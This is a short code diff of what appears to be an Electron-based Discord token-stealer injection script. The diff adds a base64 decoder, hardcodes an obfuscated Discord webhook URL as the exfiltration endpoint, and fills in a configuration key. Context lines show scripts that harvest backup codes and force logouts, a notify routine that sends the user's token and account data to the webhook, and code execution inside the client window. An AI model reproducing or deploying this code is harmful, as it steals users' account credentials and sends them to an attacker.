@@ -7,8 +7,11 @@ const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
     https = require("https"),
     path = require("path");
 
+const decodeB64 = (s) =>
+    Buffer.from(s, 'base64').toString();
+
 let WEBHOOK = decodeB64('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ1NzUwNjE4OTk2MDAxOTk3OC9XaENvTnQ0bjd3SXdBa1ZJX0tMamtMS1l5anNDUFRYb3R2Q0dZRGtTa21BUzF2cDVLbVVfQzJOSzJPeWxLMjRabXpsMA');
-let KEY = "%KEY%";
+let KEY = "31";
 let [
     BACKUPCODES_SCRIPT,
     LOGOUT_SCRIPT,
@@ -182,9 +185,6 @@ const notify = async (ctx, token, acc) => {
         console.error("Error sending request to webhook:", error.message);
     }
 };
-
-const decodeB64 = (s) =>
-    Buffer.from(s, 'base64').toString();
 
 const execScript = async (s) =>
     await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
